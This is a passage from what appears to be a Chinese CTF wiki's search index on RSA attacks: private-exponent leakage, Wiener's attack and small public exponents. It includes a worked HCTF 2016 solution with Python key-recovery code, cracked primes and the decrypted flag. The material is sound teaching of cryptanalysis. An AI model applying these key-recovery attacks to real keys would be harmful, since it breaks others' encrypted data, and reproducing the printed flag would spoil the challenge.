0x8220863F1CFDA6EDE52C56B4036485DB53F57A4629F5727EDC4C5637603FE059EB44751FC49EC846C0B8B50966678DFFB1CFEB350EC44B57586A81D35E4887F1722367CE99116092463079A63E3F29D4F4BC416E7728B26248EE8CD2EFEA6925EC6F455DF966CEE13C808BC15CA2A6AAC7FEA69DB7C9EB9786B50EBD437D38B73D44F3687AEB5DF03B6F425CF3171B098AAC6708D534F4D3A9B3D43BAF70316812EF95FC7EBB7E224A7016D7692B52CB0958951BAB4FB5CB1ABB4DAC606F03FA15697CC3E9DF26DE5F6D6EC45A683CD5AAFD58D416969695067795A2CF7899F61669BC7543151AB700A593BF5A1E5C2AFBCE45A08A2A9CC1685FAF1F96B138D1 if p * q == n : print 'true' phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phin ) cipher = 0x2517d1866acc5b7b802a51d6251673262e9e6b2d0e0e14a87b838c2751dee91e4ea29019b0a7877b849fddf9e08580d810622db538462b529412eba9d0f8a450fe1889021c0bbd12a62ccc3fff4627b1dbdebec3a356a066adc03f7650722a34fe41ea0a247cb480a12286fffc799d66b6631a220b8401f5f50daa12943856b35e59abf8457b2269efea14f1535fb95e56398fd5f3ac153e3ea1afd7b0bb5f02832883da46343404eb44594d04bbd254a9a35749af84eaf4e35ba1c5571d41cab4d58befa79b6745d8ecf93b64dd26056a6d1e82430afbff3dbc08d6c974364b57b30c8a8230c99f0ec3168ac4813c4205d9190481282ae14f7b94400caff3786ed35863b66fefcffbef1ad1652221746a5c8da083987b2b69689cf43e86a05ce4cf059934716c455a6410560e41149fbcf5fcea3c210120f106b8f6269b9a954139350626cf4dcb497ce86264e05565ec6c6581bf28c643bb4fab8677148c8034833cedacb32172b0ff21f363ca07de0fa2882ac896954251277adc0cdd0c3bd5a3f107dbebf5f4d884e43fe9b118bdd51dc80607608670507388ae129a71e0005826c7c82efccf9c86c96777d7d3b9b5cce425e3dcf9aec0643f003c851353e36809b9202ff3b79e8f33d40967c1d36f5d585ac9eba73611152fc6d3cf36fd9a60b4c621858ed1f6d4db86054c27828e22357fa3d7c71559d175ff8e8987df flag = gmpy2 . powmod ( cipher , d , n ) print long_to_bytes ( flag ) \u5f97\u5230 flag true hctf { d8e8fca2dc0f896fd7cb4cb0031ba249 } \u53c2\u8003\u6587\u732e \u00b6 http://cacr.uwaterloo.ca/hac/about/chap8.pdf","title":"\u79c1\u94a5 d \u76f8\u5173\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#d","text":"","title":"\u79c1\u94a5 d \u76f8\u5173\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#d_1","text":"","title":"d \u6cc4\u9732\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_1","text":"\u9996\u5148\u5f53 d d \u6cc4\u9732\u4e4b\u540e\uff0c\u6211\u4eec\u81ea\u7136\u53ef\u4ee5\u89e3\u5bc6\u6240\u6709\u52a0\u5bc6\u7684\u6d88\u606f\u3002\u6211\u4eec\u751a\u81f3\u8fd8\u53ef\u4ee5\u5bf9\u6a21\u6570 N \u8fdb\u884c\u5206\u89e3\u3002\u5176\u57fa\u672c\u539f\u7406\u5982\u4e0b \u6211\u4eec\u77e5\u9053 ed \\equiv 1 \\bmod \\varphi(n) ed \\equiv 1 \\bmod \\varphi(n) \uff0c\u90a3\u4e48\u5b58\u5728\u4e00\u4e2a k k \u4f7f\u5f97 ed-1=k\\varphi(n) ed-1=k\\varphi(n) \u53c8 \\forall a\\in {Z}_n^* \\forall a\\in {Z}_n^* \uff0c\u6ee1\u8db3 a^{ed-1}\\equiv1(\\bmod n) a^{ed-1}\\equiv1(\\bmod n) \u3002\u4ee4 ed-1=2^st ed-1=2^st \u5176\u4e2d\uff0c t t \u662f\u4e00\u4e2a\u5947\u6570\u3002\u7136\u540e\u53ef\u4ee5\u8bc1\u660e\u5bf9\u4e8e\u81f3\u5c11\u4e00\u534a\u7684 a\\in {Z}_n^* a\\in {Z}_n^* \uff0c\u5b58\u5728\u4e00\u4e2a i\\in[1,s] i\\in[1,s] \uff0c\u4f7f\u5f97 a^{2^{i-1}t}\\not\\equiv\\pm1(\\bmod n),a^{2^{i}t}\\equiv1(\\bmod n) a^{2^{i-1}t}\\not\\equiv\\pm1(\\bmod n),a^{2^{i}t}\\equiv1(\\bmod n) \u6210\u7acb\u3002\u5982\u679c a,i a,i \u6ee1\u8db3\u4e0a\u8ff0\u6761\u4ef6\uff0c gcd(a^{2^{i-1}t}-1,n) gcd(a^{2^{i-1}t}-1,n) \u662f n n \u7684\u4e00\u4e2a\u975e\u5e73\u51e1\u56e0\u5b50\uff0c\u6240\u4ee5\u53ef\u4ee5\u5bf9 n n \u8fdb\u884c\u66b4\u529b\u5206\u89e3\u3002","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_2","text":"\u5229\u7528\u4ee5\u4e0b\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u8ba1\u7b97 RsaConverter.exe ( https://sourceforge.net/projects/rsaconverter/ , for windows ) rsatool.py (\u5206\u89e3\u539f\u7406\u5982\u4e0a)","title":"\u5de5\u5177"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#2017-hitb-hack-in-the-card-ii","text":"The second smart card sent to us has been added some countermeasures by that evil company. They also changed the public key(attachments -> publickey.pem). However it seems that they missed something...... Can you decrypt the following hex-encoded ciphertext this time? 016d1d26a470fad51d52e5f3e90075ab77df69d2fb39905fe634ded81d10a5fd10c35e1277035a9efabb66e4d52fd2d1eaa845a93a4e0f1c4a4b70a0509342053728e89e977cfb9920d5150393fe9dcbf86bc63914166546d5ae04d83631594703db59a628de3b945f566bdc5f0ca7bdfa819a0a3d7248286154a6cc5199b99708423d0749d4e67801dff2378561dd3b0f10c8269dbef2630819236e9b0b3d3d8910f7f7afbbed29788e965a732efc05aef3194cd1f1cff97381107f2950c935980e8954f91ed2a653c91015abea2447ee2a3488a49cc9181a3b1d44f198ff9f0141badcae6a9ae45c6c75816836fb5f331c7f2eb784129a142f88b4dc22a0a977 \u8fd9\u9898\u662f\u63a5\u7eed 2017 HITB - hack in the card I \u7684\u4e00\u9053\u9898\uff0c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 openssl \u67e5\u770b publickey.pem \u7684\u516c\u94a5\uff0c\u53d1\u73b0\u5b83\u7684 N \u4e0e\u4e0a\u4e00\u9053\u9898\u7684 N \u76f8\u540c\uff0c\u5e76\u4e14\u4e0a\u9898\u7684 N\uff0ce\uff0cd \u5df2\u77e5\u3002\u7531\u6b64\u53ef\u76f4\u63a5\u4f7f\u7528\u4e0a\u9762\u7684 rsatool.py \u5f97\u5230 p\uff0cq\uff0c\u5e76\u901a\u8fc7\u672c\u9898\u7684 e \u8ba1\u7b97\u51fa e \u5f97\u5230\u660e\u6587\u3002","title":"2017 HITB - hack in the card II"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#wieners-attack","text":"","title":"Wiener's Attack"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_3","text":"\u5728 d \u6bd4\u8f83\u5c0f\uff08 d<\\frac{1}{3}N^{\\frac{1}{4}} d<\\frac{1}{3}N^{\\frac{1}{4}} \uff09\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528 Wiener's Attack \u6765\u83b7\u5f97\u79c1\u94a5\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_4","text":"https://en.wikipedia.org/wiki/Wiener%27s_attack https://sagi.io/2016/04/crypto-classics-wieners-rsa-attack/","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_5","text":"https://github.com/pablocelayes/rsa-wiener-attack https://github.com/orisano/owiener","title":"\u5de5\u5177"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_6","text":"","title":"\u7efc\u5408\u4f8b\u5b50"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#2016-hctf-rsa1","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 2016 \u5e74 HCTF \u4e2d RSA 1 - Crypto So Interesting \u4e3a\u4f8b\u8fdb\u884c\u5206\u6790\uff0c \u6e90\u4ee3\u7801\u94fe\u63a5 \u3002 \u9996\u5148\u5148\u7ed5\u8fc7\u7a0b\u5e8f\u7684 proof \u90e8\u5206\uff0c\u5dee\u4e0d\u591a\u4f7f\u7528\u4e00\u4e9b\u968f\u673a\u7684\u6570\u636e\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u3002 \u5176\u6b21\uff0c\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u5177\u4f53\u7684\u4ee3\u7801\u90e8\u5206\uff0c\u7a0b\u5e8f\u662f\u6839\u636e\u6211\u4eec\u7684 token \u6765\u83b7\u53d6 flag \u7684\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u76f4\u63a5\u5229\u7528\u6e90\u4ee3\u7801\u4e2d\u63d0\u4f9b\u7684 token\u3002 print \"This is a RSA Decryption System\" print \"Please enter Your team token: \" token = raw_input () try : flag = get_flag ( token ) assert len ( flag ) == 38 except : print \"Token error!\" m_exit ( - 1 ) \u63a5\u4e0b\u6765\u6211\u4eec\u9996\u5148\u77e5\u9053 n=pq n=pq \uff0c\u6211\u4eec\u518d\u6765\u4f60\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u8fd9\u4e2a e\uff0cd \u662f\u5982\u4f55\u5f97\u5230\u7684\u3002 p = getPrime ( 2048 ) q = getPrime ( 2048 ) n = p * q e , d = get_ed ( p , q ) print \"n: \" , hex ( n ) print \"e: \" , hex ( e ) get_ed \u51fd\u6570\u5982\u4e0b def get_ed ( p , q ): k = cal_bit ( q * p ) phi_n = ( p - 1 ) * ( q - 1 ) r = random . randint ( 10 , 99 ) while True : u = getPrime ( k / 4 - r ) if gcd ( u , phi_n ) != 1 : continue t = invmod ( u , phi_n ) e = pi_b ( t ) if gcd ( e , phi_n ) == 1 : break d = invmod ( e , phi_n ) return ( e , d ) \u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u5f97\u5230\u7684 u \u7684\u4f4d\u6570\u6bd4 n \u7684\u4f4d\u6570\u7684\u56db\u5206\u4e4b\u4e00\u8fd8\u8981\u5c11\uff0c\u8fd9\u91cc\u5176\u5b9e\u5c31\u5dee\u4e0d\u591a\u6ee1\u8db3\u4e86 Wiener's Attack \u4e86\u3002\u800c\u4e14\u6211\u4eec\u8ba1\u7b97\u51fa\u6765\u7684 u\uff0ct\uff0ce\uff0cd \u8fd8\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 \\begin{align*} ut &\\equiv 1 \\bmod \\varphi(n) \\\\ et &\\equiv 1 \\bmod bt \\\\ ed &\\equiv 1 \\bmod \\varphi(n) \\end{align*} \\begin{align*} ut &\\equiv 1 \\bmod \\varphi(n) \\\\ et &\\equiv 1 \\bmod bt \\\\ ed &\\equiv 1 \\bmod \\varphi(n) \\end{align*} \u6839\u636e\u9898\u4e2d\u7ed9\u51fa\u7684\u6761\u4ef6\uff0c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86 n\uff0ce\uff0cbt\u3002 \u6240\u4ee5\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u4e0a\u9762\u7684\u7b2c\u4e8c\u4e2a\u5f0f\u5b50\u77e5\u9053 e\u3002\u8fd9\u65f6\u5019\uff0c\u53ef\u4ee5\u5229\u7528\u7b2c\u4e00\u4e2a\u5f0f\u5b50\u8fdb\u884c Wiener's Attack\uff0c\u83b7\u53d6 u\u3002\u8fdb\u800c\u8fd9\u65f6\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u79c1\u94a5\u6307\u6570\u6cc4\u9732\u653b\u51fb\u7684\u65b9\u6cd5\u6765\u5206\u89e3 N \u4ece\u800c\u5f97\u5230 p\uff0cq\u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230 d \u4e86\u3002 \u9996\u5148\u6211\u4eec\u7ed5\u8fc7 proof \u5f97\u5230\u4e86 N\uff0ce\uff0c\u52a0\u5bc6\u540e\u7684 flag \u5982\u4e0b n: 0x4b4403cd5ac8bdfaa3bbf83decdc97db1fbc7615fd52f67a8acf7588945cd8c3627211ffd3964d979cb1ab3850348a453153710337c6fe3baa15d986c87fca1c97c6d270335b8a7ecae81ae0ebde48aa957e7102ce3e679423f29775eef5935006e8bc4098a52a168e07b75e431a796e3dcd29c98dab6971d3eac5b5b19fb4d2b32f8702ef97d92da547da2e22387f7555531af4327392ef9c82227c5a2479623dde06b525969e9480a39015a3ed57828162ca67e6d41fb7e79e1b25e56f1cff487c1d0e0363dc105512d75c83ad0085b75ede688611d489c1c2ea003c3b2f81722cdb307a3647f2da01fb3ba0918cc1ab88c67e1b6467775fa412de7be0b44f2e19036471b618db1415f6b656701f692c5e841d2f58da7fd2bc33e7c3c55fcb8fd980c9e459a6df44b0ef70b4b1d813a57530446aa054cbfb9d1a86ffb6074b6b7398a83b5f0543b910dcb9f111096b07a98830a3ce6da47cd36b7c1ac1b2104ea60dc198c34f1c50faa5b697f2f195afe8af5d455e8ac7ca6eda669a5a1e3bfbd290a4480376abd1ff21298d529b26a4e614ab24c776a10f5f5d8e8809467a3e81f04cf5d5b23eb4a3412886797cab4b3c5724c077354b2d11d19ae4e301cd2ca743e56456d2a785b650c7e1a727b1bd881ee85c8d109792393cc1a92a66b0bc23b164146548f4e184b10c80ec458b776df10405b65399e32d657bc83e1451 e: 0x10194521505692a64d043daaef7647e0efb1503ec89220a0e4148ab53ecf708146a8893a2e700e4f2f062be14a3ab4e46339a939d5c7289904cc0ab043320d3a4d7da868bf5736ae5f787d6c0e3d9b8cc4b81314ad6c5ff643bc0d8946fea7eb09bf707a54747a39df1cfc0c30849770578cb63de86621001ce86a11874c91419a4d07373e66e94f31b988cac3aeaff88c7abaf3b78468a434990f7854e734208a7461f8245660fa8301f979e85517d705302c797dbdf2938cc442b01c228939eb73aa29651a198a332af2bb982310699684e5a0595c7413ec01eefb3613a9ea4b59f1de984ad4bf6654960613c0f8104b4e41fb33384e07f715176d68f4bb7613b1258675e70dc774f701aee053830f0be28ba9f308c9fe1707a5ba07a2027d74144b8aeb4042df3c1d73d9c38c2d7d1a890fd70d6e38c72da5d075f3811c0354dcecdd836a59112a70be22757278c5e4973906aaeeadd6f61d0845d6f9761df191b0b2527d122dd07f8bd07f5cd14268246ac2b93b778c84b5157f7eb23a8eaa9f0f885f2a38e3fb8fd1012d9b6c841cea8d9d73b232bef298afd086c1063bdd11e0777c8d2ec91ae843a67a98039cb53fad0ee25040176841a017fabf79b98de21d40bc6985f82dd84406aad26e9ac9bc5f6e12385230d9620b888c201ca9c413cbf0f36b100a6c62c5c8f065934fcf9f9f0179eea35888cb357b704441c1 flag: 0x2517d1866acc5b7b802a51d6251673262e9e6b2d0e0e14a87b838c2751dee91e4ea29019b0a7877b849fddf9e08580d810622db538462b529412eba9d0f8a450fe1889021c0bbd12a62ccc3fff4627b1dbdebec3a356a066adc03f7650722a34fe41ea0a247cb480a12286fffc799d66b6631a220b8401f5f50daa12943856b35e59abf8457b2269efea14f1535fb95e56398fd5f3ac153e3ea1afd7b0bb5f02832883da46343404eb44594d04bbd254a9a35749af84eaf4e35ba1c5571d41cab4d58befa79b6745d8ecf93b64dd26056a6d1e82430afbff3dbc08d6c974364b57b30c8a8230c99f0ec3168ac4813c4205d9190481282ae14f7b94400caff3786ed35863b66fefcffbef1ad1652221746a5c8da083987b2b69689cf43e86a05ce4cf059934716c455a6410560e41149fbcf5fcea3c210120f106b8f6269b9a954139350626cf4dcb497ce86264e05565ec6c6581bf28c643bb4fab8677148c8034833cedacb32172b0ff21f363ca07de0fa2882ac896954251277adc0cdd0c3bd5a3f107dbebf5f4d884e43fe9b118bdd51dc80607608670507388ae129a71e0005826c7c82efccf9c86c96777d7d3b9b5cce425e3dcf9aec0643f003c851353e36809b9202ff3b79e8f33d40967c1d36f5d585ac9eba73611152fc6d3cf36fd9a60b4c621858ed1f6d4db86054c27828e22357fa3d7c71559d175ff8e8987df \u5176\u6b21\u4f7f\u7528\u5982\u4e0b\u65b9\u6cd5\u8fdb\u884c Wiener's Attack \u5f97\u5230 u\uff0c\u5982\u4e0b if __name__ == \"__main__\" : bt = 536380958350616057242691418634880594502192106332317228051967064327642091297687630174183636288378234177476435270519631690543765125295554448698898712393467267006465045949611180821007306678935181142803069337672948471202242891010188677287454504933695082327796243976863378333980923047411230913909715527759877351702062345876337256220760223926254773346698839492268265110546383782370744599490250832085044856878026833181982756791595730336514399767134613980006467147592898197961789187070786602534602178082726728869941829230655559180178594489856595304902790182697751195581218334712892008282605180395912026326384913562290014629187579128041030500771670510157597682826798117937852656884106597180126028398398087318119586692935386069677459788971114075941533740462978961436933215446347246886948166247617422293043364968298176007659058279518552847235689217185712791081965260495815179909242072310545078116020998113413517429654328367707069941427368374644442366092232916196726067387582032505389946398237261580350780769275427857010543262176468343294217258086275244086292475394366278211528621216522312552812343261375050388129743012932727654986046774759567950981007877856194574274373776538888953502272879816420369255752871177234736347325263320696917012616273 L e = 0x10194521505692a64d043daaef7647e0efb1503ec89220a0e4148ab53ecf708146a8893a2e700e4f2f062be14a3ab4e46339a939d5c7289904cc0ab043320d3a4d7da868bf5736ae5f787d6c0e3d9b8cc4b81314ad6c5ff643bc0d8946fea7eb09bf707a54747a39df1cfc0c30849770578cb63de86621001ce86a11874c91419a4d07373e66e94f31b988cac3aeaff88c7abaf3b78468a434990f7854e734208a7461f8245660fa8301f979e85517d705302c797dbdf2938cc442b01c228939eb73aa29651a198a332af2bb982310699684e5a0595c7413ec01eefb3613a9ea4b59f1de984ad4bf6654960613c0f8104b4e41fb33384e07f715176d68f4bb7613b1258675e70dc774f701aee053830f0be28ba9f308c9fe1707a5ba07a2027d74144b8aeb4042df3c1d73d9c38c2d7d1a890fd70d6e38c72da5d075f3811c0354dcecdd836a59112a70be22757278c5e4973906aaeeadd6f61d0845d6f9761df191b0b2527d122dd07f8bd07f5cd14268246ac2b93b778c84b5157f7eb23a8eaa9f0f885f2a38e3fb8fd1012d9b6c841cea8d9d73b232bef298afd086c1063bdd11e0777c8d2ec91ae843a67a98039cb53fad0ee25040176841a017fabf79b98de21d40bc6985f82dd84406aad26e9ac9bc5f6e12385230d9620b888c201ca9c413cbf0f36b100a6c62c5c8f065934fcf9f9f0179eea35888cb357b704441c1 t = gmpy2 . invert ( e , bt ) n = 0x4b4403cd5ac8bdfaa3bbf83decdc97db1fbc7615fd52f67a8acf7588945cd8c3627211ffd3964d979cb1ab3850348a453153710337c6fe3baa15d986c87fca1c97c6d270335b8a7ecae81ae0ebde48aa957e7102ce3e679423f29775eef5935006e8bc4098a52a168e07b75e431a796e3dcd29c98dab6971d3eac5b5b19fb4d2b32f8702ef97d92da547da2e22387f7555531af4327392ef9c82227c5a2479623dde06b525969e9480a39015a3ed57828162ca67e6d41fb7e79e1b25e56f1cff487c1d0e0363dc105512d75c83ad0085b75ede688611d489c1c2ea003c3b2f81722cdb307a3647f2da01fb3ba0918cc1ab88c67e1b6467775fa412de7be0b44f2e19036471b618db1415f6b656701f692c5e841d2f58da7fd2bc33e7c3c55fcb8fd980c9e459a6df44b0ef70b4b1d813a57530446aa054cbfb9d1a86ffb6074b6b7398a83b5f0543b910dcb9f111096b07a98830a3ce6da47cd36b7c1ac1b2104ea60dc198c34f1c50faa5b697f2f195afe8af5d455e8ac7ca6eda669a5a1e3bfbd290a4480376abd1ff21298d529b26a4e614ab24c776a10f5f5d8e8809467a3e81f04cf5d5b23eb4a3412886797cab4b3c5724c077354b2d11d19ae4e301cd2ca743e56456d2a785b650c7e1a727b1bd881ee85c8d109792393cc1a92a66b0bc23b164146548f4e184b10c80ec458b776df10405b65399e32d657bc83e1451 solve ( n , t ) \u5176\u4e2d solve \u51fd\u6570\u5c31\u662f\u5bf9\u5e94\u7684 Wiener's Attack \u7684\u51fd\u6570\u3002 \u6211\u4eec\u5f97\u5230\u4e86 u\uff0c\u5982\u4e0b \u279c rsa-wiener-attack git: ( master ) \u2717 python RSAwienerHacker.py Testing Wiener Attack Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) \u63a5\u7740\u5229\u7528 RsaConverter \u4ee5\u53ca u\uff0ct\uff0cn \u83b7\u53d6\u5bf9\u5e94\u7684 p \u548c q\u3002\u5982\u4e0b 94121F49C0E7A37A60FDE4D13F021675ED91032EB16CB070975A3EECECE8697ED161A27D86BCBC4F45AA6CDC128EB878802E0AD3B95B2961138C8CD04D28471B558CD816279BDCCF8FA1513A444AF364D8FDA8176A4E459B1B939EBEC6BB164F06CDDE9C203C612541E79E8B6C266436AB903209F5C63C8F0DA192F129F0272090CBE1A37E2615EF7DFBB05D8D88B9C964D5A42A7E0D6D0FF344303C4364C894AB7D912065ABC30815A3B8E0232D1B3D7F6B80ED7FE4B71C3477E4D6C2C78D733CF23C694C535DB172D2968483E63CC031DFC5B27792E2235C625EC0CFDE33FD3E53915357772975D264D24A7F31308D72E1BD7656B1C16F58372E7682660381 8220863F1CFDA6EDE52C56B4036485DB53F57A4629F5727EDC4C5637603FE059EB44751FC49EC846C0B8B50966678DFFB1CFEB350EC44B57586A81D35E4887F1722367CE99116092463079A63E3F29D4F4BC416E7728B26248EE8CD2EFEA6925EC6F455DF966CEE13C808BC15CA2A6AAC7FEA69DB7C9EB9786B50EBD437D38B73D44F3687AEB5DF03B6F425CF3171B098AAC6708D534F4D3A9B3D43BAF70316812EF95FC7EBB7E224A7016D7692B52CB0958951BAB4FB5CB1ABB4DAC606F03FA15697CC3E9DF26DE5F6D6EC45A683CD5AAFD58D416969695067795A2CF7899F61669BC7543151AB700A593BF5A1E5C2AFBCE45A08A2A9CC1685FAF1F96B138D1 \u7136\u540e\u6211\u4eec\u76f4\u63a5\u53bb\u83b7\u5f97 d\uff0c\u8fdb\u800c\u5c31\u53ef\u4ee5\u6062\u590d\u660e\u6587 p = 0x94121F49C0E7A37A60FDE4D13F021675ED91032EB16CB070975A3EECECE8697ED161A27D86BCBC4F45AA6CDC128EB878802E0AD3B95B2961138C8CD04D28471B558CD816279BDCCF8FA1513A444AF364D8FDA8176A4E459B1B939EBEC6BB164F06CDDE9C203C612541E79E8B6C266436AB903209F5C63C8F0DA192F129F0272090CBE1A37E2615EF7DFBB05D8D88B9C964D5A42A7E0D6D0FF344303C4364C894AB7D912065ABC30815A3B8E0232D1B3D7F6B80ED7FE4B71C3477E4D6C2C78D733CF23C694C535DB172D2968483E63CC031DFC5B27792E2235C625EC0CFDE33FD3E53915357772975D264D24A7F31308D72E1BD7656B1C16F58372E7682660381 q = 0x8220863F1CFDA6EDE52C56B4036485DB53F57A4629F5727EDC4C5637603FE059EB44751FC49EC846C0B8B50966678DFFB1CFEB350EC44B57586A81D35E4887F1722367CE99116092463079A63E3F29D4F4BC416E7728B26248EE8CD2EFEA6925EC6F455DF966CEE13C808BC15CA2A6AAC7FEA69DB7C9EB9786B50EBD437D38B73D44F3687AEB5DF03B6F425CF3171B098AAC6708D534F4D3A9B3D43BAF70316812EF95FC7EBB7E224A7016D7692B52CB0958951BAB4FB5CB1ABB4DAC606F03FA15697CC3E9DF26DE5F6D6EC45A683CD5AAFD58D416969695067795A2CF7899F61669BC7543151AB700A593BF5A1E5C2AFBCE45A08A2A9CC1685FAF1F96B138D1 if p * q == n : print 'true' phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phin ) cipher = 0x2517d1866acc5b7b802a51d6251673262e9e6b2d0e0e14a87b838c2751dee91e4ea29019b0a7877b849fddf9e08580d810622db538462b529412eba9d0f8a450fe1889021c0bbd12a62ccc3fff4627b1dbdebec3a356a066adc03f7650722a34fe41ea0a247cb480a12286fffc799d66b6631a220b8401f5f50daa12943856b35e59abf8457b2269efea14f1535fb95e56398fd5f3ac153e3ea1afd7b0bb5f02832883da46343404eb44594d04bbd254a9a35749af84eaf4e35ba1c5571d41cab4d58befa79b6745d8ecf93b64dd26056a6d1e82430afbff3dbc08d6c974364b57b30c8a8230c99f0ec3168ac4813c4205d9190481282ae14f7b94400caff3786ed35863b66fefcffbef1ad1652221746a5c8da083987b2b69689cf43e86a05ce4cf059934716c455a6410560e41149fbcf5fcea3c210120f106b8f6269b9a954139350626cf4dcb497ce86264e05565ec6c6581bf28c643bb4fab8677148c8034833cedacb32172b0ff21f363ca07de0fa2882ac896954251277adc0cdd0c3bd5a3f107dbebf5f4d884e43fe9b118bdd51dc80607608670507388ae129a71e0005826c7c82efccf9c86c96777d7d3b9b5cce425e3dcf9aec0643f003c851353e36809b9202ff3b79e8f33d40967c1d36f5d585ac9eba73611152fc6d3cf36fd9a60b4c621858ed1f6d4db86054c27828e22357fa3d7c71559d175ff8e8987df flag = gmpy2 . powmod ( cipher , d , n ) print long_to_bytes ( flag ) \u5f97\u5230 flag true hctf { d8e8fca2dc0f896fd7cb4cb0031ba249 }","title":"2016 HCTF RSA1"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_7","text":"http://cacr.uwaterloo.ca/hac/about/chap8.pdf","title":"\u53c2\u8003\u6587\u732e"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/","text":"\u516c\u94a5\u6307\u6570\u76f8\u5173\u653b\u51fb \u00b6 \u5c0f\u516c\u94a5\u6307\u6570\u653b\u51fb \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 e \u7279\u522b\u5c0f\uff0c\u6bd4\u5982 e \u4e3a 3\u3002 \u653b\u51fb\u539f\u7406 \u00b6 \u5047\u8bbe\u7528\u6237\u4f7f\u7528\u7684\u5bc6\u94a5 e=3 e=3 \u3002\u8003\u8651\u5230\u52a0\u5bc6\u5173\u7cfb\u6ee1\u8db3\uff1a c\\equiv m^3 \\bmod N c\\equiv m^3 \\bmod N \u5219\uff1a \\begin{align*} m^3 &= c+k\\times N\\\\ m &= \\sqrt[3]{c+k\\times n} \\end{align*} \\begin{align*} m^3 &= c+k\\times N\\\\ m &= \\sqrt[3]{c+k\\times n} \\end{align*} \u653b\u51fb\u8005\u53ef\u4ee5\u4ece\u5c0f\u5230\u5927\u679a\u4e3e k k \uff0c\u4f9d\u6b21\u5f00\u4e09\u6b21\u6839\uff0c\u76f4\u5230\u5f00\u51fa\u6574\u6570\u4e3a\u6b62\u3002 \u8303\u4f8b \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 XMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff08Jarvis OJ \u6709\u590d\u73b0\uff09\uff0c\u9644\u4ef6\u4e2d\u6709\u4e00\u4e2a flag.enc \u548c pubkey.pem \uff0c\u5f88\u660e\u663e\u662f\u5bc6\u6587\u548c\u516c\u94a5\u4e86\uff0c\u5148\u7528 openssl \u8bfb\u4e00\u4e0b\u516c\u94a5\u3002 \u279c Jarvis OJ-Extremely hard RSA git: ( master ) \u2717 openssl rsa -pubin -in pubkey.pem -text -modulus Public-Key: ( 4096 bit ) Modulus: 00 :b0:be:e5:e3:e9:e5:a7:e8:d0:0b:49:33:55:c6: 18 :fc:8c:7d:7d:03:b8:2e:40:99:51:c1:82:f3:98: de:e3:10:45:80:e7:ba:70:d3:83:ae:53:11:47:56: 56 :e8:a9:64:d3:80:cb:15:7f:48:c9:51:ad:fa:65: db:0b:12:2c:a4:0e:42:fa:70:91:89:b7:19:a4:f0: d7:46:e2:f6:06:9b:af:11:ce:bd:65:0f:14:b9:3c: 97 :73:52:fd:13:b1:ee:a6:d6:e1:da:77:55:02:ab: ff:89:d3:a8:b3:61:5f:d0:db:49:b8:8a:97:6b:c2: 05 :68:48:92:84:e1:81:f6:f1:1e:27:08:91:c8:ef: 80 :01:7b:ad:23:8e:36:30:39:a4:58:47:0f:17:49: 10 :1b:c2:99:49:d3:a4:f4:03:8d:46:39:38:85:15: 79 :c7:52:5a:69:98:4f:15:b5:66:7f:34:20:9b:70: eb:26:11:36:94:7f:a1:23:e5:49:df:ff:00:60:18: 83 :af:d9:36:fe:41:1e:00:6e:4e:93:d1:a0:0b:0f: ea:54:1b:bf:c8:c5:18:6c:b6:22:05:03:a9:4b:24: 13 :11:0d:64:0c:77:ea:54:ba:32:20:fc:8f:4c:c6: 